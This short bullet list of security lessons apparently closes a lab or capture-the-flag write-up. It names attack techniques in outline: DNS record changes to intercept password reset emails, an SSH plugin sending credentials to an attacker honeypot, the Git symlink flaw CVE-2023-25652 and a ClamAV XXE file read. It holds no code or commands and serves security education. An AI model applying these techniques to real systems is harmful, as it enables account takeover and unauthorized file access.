- **DNS Manipulation:** The ability to update DNS records can redirect services and intercept sensitive communications like password reset emails.
    
- **Credential Interception:** Password reset mechanisms can be abused to gain unauthorized access to applications.
    
- **SSH Honeypots:** Custom plugins that connect to remote servers can be abused to capture credentials by directing them to attacker-controlled honeypots.
    
- **Git Symlink Vulnerabilities:** Git's symlink handling during patch application (CVE-2023-25652) can be abused to write files to arbitrary locations.
    
- **ClamAV XXE (CVE-2023-20052):** The ClamAV DMG parser is vulnerable to XXE attacks, which can be used to read arbitrary files when debug mode is enabled.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.




